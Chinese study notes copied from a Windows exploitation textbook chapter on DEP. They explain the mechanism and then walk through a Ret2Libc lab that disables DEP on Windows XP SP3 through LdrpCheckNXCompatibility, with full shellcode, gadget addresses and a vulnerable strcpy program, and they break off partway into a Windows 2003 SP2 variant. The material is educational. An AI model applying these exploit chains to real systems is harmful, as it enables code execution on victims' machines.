​		建立好控件工程后，我们通过类视图中的“VulnerAX_SEHLib→_DVulnerAX→Add→Add  Method”选项添加一个可以在 Web 页面中调用的接口函数。函数返回类型选择 void，函数名 称为 test，参数类型为 BSTR，参数名称为 str。如图 11.7.2 所示。

![image-20220713181617587](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220713181617587.png)

![image-20220713181654098](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220713181654098.png)

![image-20220713182015292](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220713182015292.png)

# 第12章 DEP

## 12.1 DEP 机制的保护原理 

​		DEP 的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 shellcode 时， 程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。如图 12.1.1 所示。

![image-20220719172259577](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220719172259577.png)

​		DEP 的**主要作用是阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。** 微软从 Windows XP SP2 开始提供这种技术支持，根据实现的机制不同可分为：软件 DEP （Software DEP）和硬件 DEP（Hardware-enforced DEP）

​		软件 DEP 其实就是我们前面介绍的 SafeSEH，它的目的是阻止利用 S.E.H 的攻击，这种机 制与 CPU 硬件无关，Windows 利用软件模拟实现 DEP，对操作系统提供一定的保护。现在大 家明白为什么在 SafeSEH 的校验过程中会检查异常处理函数是否位于非可执行页上了吧。

​		硬件 DEP 才是真正意义的 DEP，硬件 DEP 需要 CPU 的支持，AMD 和 Intel 都为此做了设 计，AMD 称之为 No-Execute Page-Protection (NX)，Intel 称之为 Execute Disable Bit (XD) ，两者功能及工作原理在本质上是相同的。

​		**操作系统通过设置内存页的 NX/XD 属性标记，来指明不能从该内存执行代码。**为了实现 这个功能，需要在内存的页面表（Page T able）中加入一个特殊的标识位（NX/XD）来标识是 否允许在该页上执行指令。当该标识位设置为 0 里表示这个页面允许执行指令，设置为 1 时表 示该页面不允许执行指令。

​		由于软件 DEP 就是传说中的 SafeSEH，关于 SafeSEH 的突破前面我们已经介绍过，所以 在这一节中我们只对硬件 DEP 进行讨论和分析。

​		可以通过如下方法检查 CPU 是否支持硬件 DEP，右键单击桌面上的“我的电脑”图 标，选择“属性”，在打开的“系统属性”窗口中点击“高级”选项卡。在“高级”选项卡页 面中的“性能”下单击“设置”打开“性能选项”页。单击“数据执行保护”选项卡，在该页 面中我们可确认自己计算机的 CPU 是否支持 DEP。如果 CPU 不支持硬件 DEP 该页面底部会 有如下类似提示：“您的计算机的处理器不支持基于硬件的 DEP。但是，Windows 可以使用 DEP 软件帮助保护免受某些类型的攻击”。如图 12.1.2 所示。

![image-20220719173521844](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220719173521844.png)

​						 12.1.2   Windows 7 下 DEP 选项页示例

根据启动参数的不同，DEP 工作状态可以分为四种。

**（1）Optin：**默认仅将 DEP 保护应用于 Windows 系统组件和服务，对于其他程序不予保护， 但用户可以通过应用程序兼容性工具(ACT，Application Compatibility Toolkit)为选定的程序启用 DEP，在 Vista 下边经过/NXcompat 选项编译过的程序将自动应用 DEP。这种模式可以被应用 程序动态关闭，它多用于普通用户版的操作系统，如 Windows XP、Windows Vista、Windows7。 

**（2）Optout：**为排除列表程序外的所有程序和服务启用 DEP，用户可以手动在排除列表中 指定不启用 DEP 保护的程序和服务。这种模式可以被应用程序动态关闭，它多用于服务器版 的操作系统，如 W indows 2003、Windows 2008。

**（3）AlwaysOn：**对所有进程启用 DEP 的保护，不存在排序列表，在这种模式下，DEP 不 可以被关闭，目前只有在 64 位的操作系统上才工作在 AlwaysOn 模式。 

**（4）AlwaysOff：**对所有进程都禁用 DEP，这种模式下，DEP 也不能被动态开启，这种模 式一般只有在某种特定场合才使用，如 DEP 干扰到程序的正常运行。

​		我们可以通过切换图 12.1.2 中的复选框切换 Optin 和 Optout 两种模式。还可以通过修改 c:\boot.ini 中的/noexecute 启动项的值来控制 DEP 的工作模式。如图 12.1.3 所示，DEP 在该操 作系统上的工作模式为 Optout。

![image-20220719213758785](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220719213758785.png)

​						图 12.1.3 W indows XP下DEP 默认启动状态

​		**/NXCOMPAT** 是 Visual Studio 2005 及后续版本中引入一个链接选项，默认情况 下是开启的。在本书中使用的 Visual S tudio 2008 ( VS 9.0)中，可以在通过菜单中的 Project(项目)→ project Properties（项目属性） →Configuration Properties（配置属性）→Linker（链接器）→Advanced（高级）→Data Execution Prevention  (DEP)  【数据执行保护{}（DEP）】中选择是不是使用/NXCOMPAT 编译程序，如图 12.1.4 所示。

![image-20220719214307886](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220719214307886.png)

​				图 12.1.4 VS 2008 中设置/NXCOMPAT 编译选项

​		采用/NXCOMPAT编译的程序会在文件的PE头中设置IMAGE_DLLCHARACTERISTICS_  NX_COMPAT 标识，该标识通过结构体 IMAGE_OPTIONAL_HEADER 中的 DllCharacteristics 变量进行体现，当 DllCharacteristics 设置为 0x0100 表示该程序采用了/NXCOMPAT 编译。关于 结构体 IMAGE_OPTIONAL_HEADER 的详细说明大家可以查阅 MSDN 相关资料，在这我们就 不过多讨论了。

​		经过/NXCOMPAT编译的程序有什么好处呢？通过前面的介绍我们知道用户版的操作系统 中 DEP 一般工作在 Optin 状态，此时 DEP 只保护系统核心进程，而对于普通的程序是没有保 护的。虽然用户可以通过工具自行添加，但这无形中增高了安全的门槛，所以微软推出了 /NXCOMPAT 编译选项。经过/NXCOMPAT 编译的程序在 Windows vista 及后续版本的操作系统 上会自动启用 DEP 保护。

​		DEP 针对溢出攻击的本源，完善了内存管理机制。通过将内存页设置为不可执行状态，来 阻止堆栈中 shellcode 的执行，这种釜底抽薪的机制给缓冲溢出带来了前所未有的挑战。这也是 迄今为止在本书中我们遇到的最有力的保护机制，它能够彻底阻止缓冲区溢出攻击么？答案是 否定的。

​		如同前面介绍的安全机制一样，DEP 也有着自身的局限性。

​		**首先，**硬件 DEP 需要 CPU 的支持，但**并不是所有的 CPU 都提供了硬件 DEP 的支持**，在 一些比较老的 CPU 上边 DEP 是无法发挥作用的。

​		**其次，**由于兼容性的原因 **Windows 不能对所有进程开启 DEP 保护，否则可能会出现异常。** 例如一些第三方的插件 DLL，由于无法确认其是否支持 DEP，对涉及这些 DLL 的程序不敢贸 然开启 DEP 保护。再有就是使用 ATL 7.1 或者以前版本的程序需要在数据页面上产生可以执行 代码，这种情况就不能开启 DEP 保护，否则程序会出现异常。

​		再次，**/NXCOMPAT 编译选项，**或者是 IMAGE_DLLCHARACTERISTICS_NX_COMPAT 的设置，**只对 Windows Vista 以上的系统有效。**在以前的系统上，如 Windows XP SP3 等，这 个设置会被忽略。也就是说，即使采用了该链接选项的程序在一些操作系统上也不会自动启用 DEP 保护。

​		最后，当 DEP 工作在最主要的两种状态 Optin 和 Optout 下时，DEP 是可以被动态关闭和 开启的，这就说明操作系统提供了某些 API 函数来控制 DEP 的状态。同样很不幸的是早期的 操作系统中对这些 API 函数的调用没有任何限制，所有的进程都可以调用这些 API 函数，这就 埋下了很大的安全隐患，也为我们突破 DEP 提供了一条道路。

## 12.2 攻击未启用 DEP 的程序 

​		其实这种方法不能称之为“绕过”DEP，因为 DEP 根本就没有发挥作用，在这提出这种方 法的原因是要说明并不是只要 CPU 和操作系统支持 DEP，所有的程序就都安全了。

​		就像我们前面说的那样，由于微软要考虑兼容性的问题，所以不能对所有进程强制开启 DEP（64 位下的 AlwaysOn 除外）。DEP 保护对象是进程级的，当某个进程的加载模块中只要 有一个模块不支持 DEP，这个进程就不能贸然开启 DEP，否则可能会发生异常。这样的程序在Windows 下还是有很多的，即使在最新的 Win7 操作系统下依然有很多的程序没有启用 DEP（如 图 12.2.1），所以想办法攻击未启用 DEP 保护的程序也不失为一种简单有效的办法。

![image-20220719215551389](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220719215551389.png)

​									图 12.2.1 W in7 下很多进程未开启 DEP

​		由于这种攻击手段不与 DEP 有着正面冲突，只是一种普通的溢出攻击，所以在这我们就 不过多讨论了，权当为大家提供一种思路

## 12.3 利用 Ret2Libc 挑战 DEP

​		在 **DEP 保护下溢出失败的根本原因**是 DEP 检测到程序转到非可执行页执行指令了，如果 我们让程序跳转到一个已经存在的系统函数中结果会是怎样的呢？已经存在的系统函数必然存在于可执行页上，所以此时 DEP 是不会拦截的，Ret2libc 攻击的原理也正是基于此的。

​		Ret2libc 是 Return-to-libc 简写，由于 DEP 不允许我们直接到非可执行页执行指令，我们就需要在其他可执行的位置找到符合我们要求的指令，让这条指令来替我们工作，为了能够控制程序流程，在这条指令执行后，我们还需要一个返回指令，以便收回程序的控制权，然后继续 下一步操作，整体流程如图 12.3.1 所示。

![image-20220720210232771](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220720210232771.png)

​		简言之，**只要为 shellcode 中的每条指令都在代码区找到一条替代指令**，就可以完成 exploit 想要的功能了。理论上说，这种方法是可行的，但是**实际上操作难度极大**。姑且不说是不是 shellcode 中的每条指令都能在代码区找到替代指令，就算所有替代指令都找好了，如何保证每条指令的地址都不包含 0x00 截断字符呢？栈帧如何去布置呢？我们不断使用替代指令执行操作，然后通过 retn 指令收回控制权，不停地跳来跳去，稍有不慎就跳沟里去了。

​		**为此**，我们在继承这种思想的大前提下，**介绍三种经过改进的、相对比较有效的绕过 DEP 的 exploit 方法。**

​	（1）通过**跳转到 ZwSetInformationProcess 函数将 DEP 关闭**后再转入 shellcode 执行。

​	（2）通过**跳转到 VirtualProtect 函数来将 shellcode 所在内存页设置为可执行状态**，然后再 转入 shellcode 执行。 

​	（3）通过**跳转到 VIrtualAlloc 函数开辟一段具有执行权限的内存空间**，然后**将 shellcode 复 制到这段内存中**执行。

### 12.3.1 Ret2Libc 实战之利用 ZwSetInformationProcess************

​		直接将进程的 DEP 保护关闭。先来了解一个重要的结构和一个重要的函数。

​		**一个进程的 DEP 设置标识**保存**在 KPROCESS 结构中的_KEXECUTE_OPTIONS 上**，而这个标识**可以通过 API 函数 ZwQueryInformationProcess 和 ZwSetInformationProcess 进行查询和 修改。**

```
题外话：在有些资料中将这些函数称为 NtQueryInformationProcess 和 NtSetInformation 
Process，在 Ntdll.dll 中 Nt**函数和 Zw**函数功能是完全一样的，本书中我们统一称
之为 Zw**。
```

首先来看一下_KEXECUTE_OPTIONS 的结构。

```
_KEXECUTE_OPTIONS 
 Pos0ExecuteDisable :1bit 
 Pos1ExecuteEnable :1bit 
 Pos2DisableThunkEmulation :1bit 
 Pos3Permanent :1bit 
 Pos4ExecuteDispatchEnable :1bit 
 Pos5ImageDispatchEnable :1bit 
 Pos6Spare :2bit 
```

​		这些**标识位中前 4 个 bit 与 DEP 相关**，当前进程 **DEP 开启时 ExecuteDisable 位被置 1**，当 进程 **DEP 关闭时 ExecuteEnable 位被置 1**，DisableThunkEmulation 是为了兼容 ATL 程序设置的， Permanent 被置 1 后表示这些标志都不能再被修改。**真正影响 DEP 状态是前两位**，所以我们**只要将_KEXECUTE_OPTIONS 的值设置为 0x02（二进制为 00000010）就可以将 ExecuteEnable 置为 1。**

​		接下来我们来看看关键函数 NtSetInformationProcess：

```
ZwSetInformationProcess( 
 IN HANDLE ProcessHandle, 
 IN PROCESS_INFORMATION_CLASS ProcessInformationClass, 
 IN PVOID ProcessInformation, 
 IN ULONG ProcessInformationLength );
```

​		**第一个参数**为进程的句柄，设置为−1 的时候表示为当前进程；**第二个参数**为信息类；**第三个参数**可以用来设置_KEXECUTE_OPTIONS，**第四个参数**为第三个参数的长度。

​		Skape 和 Skywing 在他们的论文 Bypassing Windows Hardware-Enforced DEP 中给出了**关闭 DEP 的参数设置：**

```
ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE; 
ZwSetInformationProcess( 
 NtCurrentProcess(), // (HANDLE)-1 
 ProcessExecuteFlags, // 0x22 
 &ExecuteFlags, // ptr to 0x02 
 sizeof(ExecuteFlags)); // 0x4
```

​		所以我们**只要构造一个的合乎要求的栈帧，然后调用这个函数就可以为进程关闭 DEP**。还有一个小问题，函数的参数中包含着 0x00 这样的截断字符，这会造成字符串复制的时 候被截断。既然自己构造参数会出现问题，那么我们可不可以在系统中寻找已经构造好的参数呢？**如果系统中存在一处关闭进程 DEP 的调用，我们就可直接利用它构造参数来关闭进程 的 DEP 了。**

​		由于**微软的兼容性考虑**，如果一个进程的 Permanent 位没有设置，当它加载 DLL 时，系统就会对这个 DLL 进行 DEP 兼容性检查，当存在兼容性问题时进程的 DEP 就会被关闭。 为此**微软设立了LdrpCheckNXCompatibility函数，当符合以下条件之一时进程的DEP会被关闭**：

（1）当 DLL 受 SafeDisc 版权保护系统保护时； 

（2）当 DLL 包含有.aspcak、.pcle、.sforce 等字节时；

（3）Windows Vista 下面当 DLL 包含在注册表“HKEY_LOCAL_MACHINE\SOFTWARE  \Microsoft\ Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions”键下边标识出不需要启动 DEP 的模块时。

​	如果我们能够模拟其中一种情况，进程的 DEP 就会被关闭。

​		这 里选择第一个条件进行尝试。我们来看一下 Windows XP SP3 下 LdrpCheckNXCompatibility 关 闭 DEP 的具体流程，以 SafeDisc 为例。如图 12.3.2 所示。

![image-20220720212002501](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220720212002501.png)

​		现在我们知道 LdrpCheckNXCompatibility 关闭 DEP 的流程了，我们开始尝试模拟这个过程，我们将从 0x7C93CD24 入手关闭 DEP，这个地址可以通过 OllyFindAddr 插件中的 Disable DEP→Disable DEP <=XP SP3 来搜索，如图 12.3.3 所示。

![image-20220727164615418](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220727164615418.png)

​								图 12.3.3 关闭 DEP 入口地址搜索结果



|           | 推荐使用的环境 | 备注 |
| --------- | -------------- | ---- |
| 操作系统  | Windows XP SP3 |      |
| DEP状态   | optout         |      |
| 编译器    | VC++6.0        |      |
| 编译选项  | 禁用优化选项   |      |
| build版本 | release版本    |      |

```
#include<stdlib.h> 
#include<string.h> 
#include<stdio.h> 
#include<windows.h>
char shellcode[]= 
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" 
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53" 
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B" 
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95" 
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59" 
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A" 
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75" 
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03" 
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB" 
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" 
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90" 
"\x52\xE2\x92\x7C"//MOV EAX,1 RETN 地址
"\x85\x8B\x1D\x5D"//修正 EBP 
"\x19\x4A\x97\x7C"//增大 ESP 
"\xB4\xC1\xC5\x7D"//jmp esp 
"\x24\xCD\x93\x7C"//关闭 DEP 代码的起始位置
"\xE9\x33\xFF\xFF"//回跳指令
"\xFF\x90\x90\x90" 
;
void test() 
{ 
 char tt[176]; 
 strcpy(tt,shellcode); 
} 
int main() 
{ 
 HINSTANCEhInst = LoadLibrary("shell32.dll"); 
 char temp[200]; 
 test(); 
 return 0; 
} 
```

对实验思路和代码简要解释如下。 

（1）为了更直观地反映绕过 DEP 的过程，我们在本次实验中**不启用 GS 和 SafeSEH。** 

（2）函数 test 存在一个典型的溢出，通过向 str 复制超长字符串造成 str 溢出，进而覆盖函数返回地址。 

（3）将函数的返回地址覆盖为类似 MOV AL,1 retn的指令，在将AL置1后转入0x7C93CD24 关闭 DEP。 

（4）DEP 关闭后 shellcode 就可以正常执行了

​	通过前面的分析，我们需要先找到类似 MOV AL,1 RETN 的指令，即可以将 AL 置 1，又 可以通过 retn 收回程序控制权。OllyFindAddr 插件的 Disable DEP→Disable DEP <=XP SP3 搜索 结果的 Step2 部分就是符合要求的指令。搜索结果如图 12.3.4 所示。

![image-20220727164744033](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220727164744033.png)

​					图 12.3.4 类似 MOV AL,1 retn 的指令搜索结果

​		为了避免执行 strcpy 时 shellcode 被截断，我们需要选择一个不包含 0x00 的地址，本次实验中我们使用 0x7C92E252 覆盖函数的返回地址。

​		关于覆盖掉函数返回地址所需字符串长度的 计算我们不再讨论，大家可以根据我们前面介绍的方法来自行计算（**使用0x90填充 shellcode，找出 tt[0] 的地址（0x0012FDFC)。然后在分析栈，找出 test() 的返回地址（0x0012FEB0），来确定 shellcode 的长度为 184字节（180+4）**），在本次实验中我们需要 184 个字节可以覆盖掉函数返回地址，所以我们在 181~184 字节处放上 0x7C92E252，shellcode 内容如下所示。

```
charshellcode[]= 
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" 
"……" 
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" 
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90" 
"\x52\xE2\x92\x7C"//MOV EAX,1 RETN 地址
; 
```

​		然后编译程序，用 OllyDbg 加载调试程序。在 0x7C92E257，即 MOV EAX,1 后边的 RETN 指令处暂停程序。观察堆栈可以看到此时 ESP 指向 test 函数返回地址的下方，而这个 ESP 指 向的内存空间存放的值将是 RETN 指令要跳到的地址，如图 12.3.5 所示。

![image-20220727180958550](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220727180958550.png)

​									图 12.3.5  执行 retn 指令时内存状态

​		所以我们需要在这个位置放上 0x7C93CD24（**流程图中第二步CMP AL，1**） 以便让程序转入关闭 DEP 流程，我们为 shellcode 添加 4 个字节，并放置 0x7C93CD24，如下所示。

```
charshellcode[]= 
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" 
"……" 
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" 
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90" 
"\x52\xE2\x92\x7C"//MOV EAX,1 RETN 地址
"\x24\xCD\x93\x7C"//关闭 DEP 代码的起始位置
; 
```

​		重新编译程序后，用 OllyDbg 重新加载程序，在 0x7C93CD6F，即关闭 DEP 后的 RETN 4 处下断点，然后让程序直接运行。但程序并没有像我们想象的那样在 0x7C93CD6F 处中断，而 是出现了异常。如图 12.3.6 所示，程序现在需要对 EBP-4 位置写入数据，但 EBP 在溢出的时 候被破坏了，目前 EBP-4 的位置并不可以写入，所以程序出现了写入异常(可能不同版本的OD显示出来的不同 英文原版会显示出写入异常)

![image-20220727185706064](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220727185706064.png)

​	 								图 12.3.6 EBP 在溢出时被破坏

​		所以我们现在的 shellcode 布局是行不通的，在转入 0x7C93CD24 前我们需要将 EBP 指向一个可写的位置。

​		我们可以通过类似 PUSH ESP POP EBP RETN 的指令将 **EBP 定位到一个可写的位置**，依然 请出我们的 OllyFindAddr 插件，我们可以在 Disable DEP <=XP SP3 搜索结果的 Setp3 部分查看 当前内存中所有符合条件的指令，如图 12.3.7 所示。

![image-20220727190226292](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220727190226292.png)

​									图 12.3.7 修正 EBP 指令的搜索结果

​		指令虽然找到了不少，但符合条件的不多。首先回顾一下图 12.3.5 中各寄存器的状态，所有的寄存器中只有 ESP 指向的位置可以写入，所以现在我们只能选择PUSH ESP POP EBP  RETN 指令序列了。现在还有一个严重的问题需要解决，我们直接将 ESP 的值赋给 EBP 返回后，ESP 相对 EBP 位于高址位置，当有入栈操作时 EBP-4 处的值可能会被冲刷掉，进而影响传入 ZwSetInformationProcess 的参数，造成 DEP 关闭失败。

​		**先**使用 0x5D1D8B85 处的 PUSH ESP POP EBP RETN 04 指令**来修正 EBP**，然后再根据堆栈情况想办法消除EBP-4 被冲刷的影响。先对 shellcode 重新布局，在转入关闭 DEP 流程前加入修正 EBP 指令，代码如下所

```
charshellcode[]= 
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" 
"……" 
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" 
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90" 
"\x52\xE2\x92\x7C" //MOV EAX,1 RETN 地址
"\x85\x8B\x1D\x5D" //修正 EBP 
"\x24\xCD\x93\x7C" //关闭 DEP 代码的起始位置
; 
```

​		重新编译程序后用 OllyDbg 加载，在 0x7C95683B 处，即 CALL ZwSetI nformationProcess 时下断点，待程序中断后观察堆栈情况。如图 12.3.8 所示，EBP-4 中的内容已经被冲刷掉，内容已经被修改为 0x22，根据_KEXECUTE_OPTIONS 结构我们知道 DEP 只和结构中的前 4 位有关，只要前 4 位为二进制代码为 0100 就可关闭 DEP，而 0x22（00100010）刚刚符合这个要求，所以用 0x22 冲刷掉 EBP-4 处的值还是可以关闭 DEP 的。

![image-20220727200302444](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220727200302444.png)

​										图 12.3.8 EBP-4 处被修改为 0x22 

​		虽然现在我们已经关闭了 DEP，但是我们失去了进程的控制权。我们再来看看关闭 DEP 后程序返回时的堆栈情况：按 F8 键单步运行程序，在 0x7C93CD6F 处，即 RETN 4 处暂停， 观察堆栈情况。如图 12.3.9 所示，ESP 指向 0x0012FEBC，大家看这个 0x00000004 是不是很眼 熟？这就是关闭 DEP 时的 PUSH 4 操作的结果，这个位置也被冲刷了！现在有家回不去，所以 我们不能简单地在修正 EBP 后直接关闭 DEP，还需要对 ESP 或者 EBP 进行调整。

![image-20220727200858401](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220727200858401.png)

​					图 12.3.9 关闭 DEP 后程序返回时返回地址被冲刷

​		一般来说当 ESP 值小于 EBP 时，防止入栈时破坏当前栈内内容的调整方法不外乎减小 ESP 和增大 EBP，由于本次实验中我们的 shellcode 位于内存低址，所以减小 ESP 可能会破坏 shellcode，而增大 EBP 的指令在本次实验中竟然找不到。一个变通的方法是增大 ESP 到一个安全的位置，让 EBP 和 ESP 之间的空间足够大，这样关闭 DEP 过程中的压栈操作就不会冲刷 到 EBP 的范围内了。

​		可以使用带有偏移量的 RETN 指令来达到增大 ESP 的目的，如 RETN 0x 28 等指令可 以执行 RETN指令后再将 ESP 增加0x28个字节。我们可以通过 OllyFindAddr插件中的Overflow  return address-> POP RETN+N  （pop 0  return ----）选项来查找相关指令，在搜索结果中选取指令时只有一个条件：不能对 ESP 和 EBP 有直接操作。否则我们会失 去对程序的控制权。查找部分结果如图 12.3.10 所示。

![image-20220727202941483](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220727202941483.png)

​		在这我们选择 0x7C974A19 处的 RETN 0x 28 指令来增大 ESP。我们对 shellcode 重新布局，在关闭 DEP 前加入增大 ESP 指令地址。需要注意的是修正 EBP 指令返回 时带有的偏移量会影响后续指令，所以我们在布置 shellcode 的时要加入相应的填充。

```
charshellcode[]= 
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" 
"……" 
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" 
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90" 
"\x52\xE2\x92\x7C" //MOV EAX,1 RETN 地址
"\x85\x8B\x1D\x5D" //修正 EBP 
"\x19\x4A\x97\x7C" //增大 ESP 
"\x90\x90\x90\x90" //jmp esp 
"\x24\xCD\x93\x7C" //关闭 DEP 代码的起始位置
; 
```

​		先在 0x7C95683B 处，即 CALL  ZwSetInformationProcess 时下断点，然后单步运行到 0x7C93CD6F，堆栈情况如图 12.3.11 所示。

![image-20220727205329493](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220727205329493.png)

​			图 12.3.11 增大 ESP 后关闭 DEP 返回时堆栈状态

​		可以看到，增大 ESP 之后我们的关键数据都没有被破坏。执行完 RETN 0x04 后 ESP 将指 向 0x0012FEC4，所以我们只要在 0x0012FEBC 放置一条 JMP ESP 指令就可让程序转入堆栈执 行指令了。大家可以通过 OllyFindAddr 插件中的 Overflow return address→Find CALL/JMP ESP 来搜索符合要求的指令，部分搜索结果如图 12.3.12 所示

![image-20220727210157157](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220727210157157.png)

​							图 12.3.12 CALL/JMP ESP 指令部分搜索结果

​		本次实验我们选择 0x7DC5C1B4 处的 JMP ESP，然后我在 0x0012FEC4 处放置一个长跳指令，让程序跳转到 shellcode 的起始位置来执行 shellcode，根据图 12.3.11 中的内存状态，可以 计算出 0x0012FEC4 距离 shellcode 起始位置有 200 个字节，所以跳转指令需要回调 205 个字节 （200+5 字节跳转指令长度）。分析结束，我们开始布置 sh ellcode，shellcode 布局如图 12.3.13 所示。

![image-20220727210254953](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220727210254953.png)

```
charshellcode[]= 
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" 
"……" 
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" 
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90" 
"\x52\xE2\x92\x7C" //MOV EAX,1 RETN 地址
"\x85\x8B\x1D\x5D" //修正 EBP 
"\x19\x4A\x97\x7C" //增大 ESP 
"\xB4\xC1\xC5\x7D" //jmp esp 
"\x24\xCD\x93\x7C" //关闭 DEP 代码的起始位置
"\xE9\x33\xFF\xFF" //回跳指令
"\xFF\x90\x90\x90" 
```

​		按照图 12.3.13 中布局布置好 shellcode 后将程序重新编译，用 OllyDbg 加载程序，我们建 议您在 0x7C93CD6F 处下断点，待程序中断后，我们按 F8 键单步运行程序，并注意各指令对 堆栈及程序流程的影响，理解这种 shellcode 的布置思路。执行完 JMP ESP 后就可以看到程序 转入 shellcode，如图 12.3.14 所示。???????????????????????????????????????????????????????????????????????????????????????

​	继续运行程序就可以看到熟悉的对话框，如图 12.3.15 所示。

![image-20220727215954233](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220727215954233.png)

​										图 12.3.15 shellcode 成功执行

​		补充一点，微软在 Windows 20 03 SP2 以后对 LdrpCheckNXCompatibility 函数进行了少许 修改，对我们影响最大的是该函数在执行过程中会对 ESI 指向的内存附近进行操作，如图 12.3.16 所示。 

![image-20220727220709095](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220727220709095.png)

​		这就要保证 ESI 指向的内存为可写内存，前边我们已经介绍过了调整 EBP 的方法，大家 可以利用类似的指令如 push esp pop esi retn 来调整 ESI，这些指令显示在 OllyFindAddr 插件中 Disable DEP→Disable DEP >=2003 SP2 搜索结果的 step4 部分。

​		但这些指令不是很好找到的，这里介绍一种变通的方法。

 （1）找到 pop eax retn 指令，并让程序转入该位置执行。 

（2）找到一条 pop esi retn 的指令，并保证在执行（1）中 pop eax 时它的地址位于栈顶，这 样就可以把该地址放到 eax 中。 

（3）找到 push esp jmp eax 指令，并转入执行。 这样就相当于执行了 push esp pop esi retn，esi 被指到了可写位置。下边我们给出一种可以 在 Windows 2 003 SP2 下边成功溢出的代码，大家可以自行调试，感受一下跳板执行选取和 shellcode 布局的思路。代码运行环境为 Windows 20 03 SP2 中文版，代码中的各跳板地址可能需要重新调试。

```
#include<stdlib.h> 
#include<string.h> 
#include<stdio.h> 
#include<windows.h>
charshellcode[]= 
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" 
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53" 
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B" 
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95" 
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59" 
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A" 
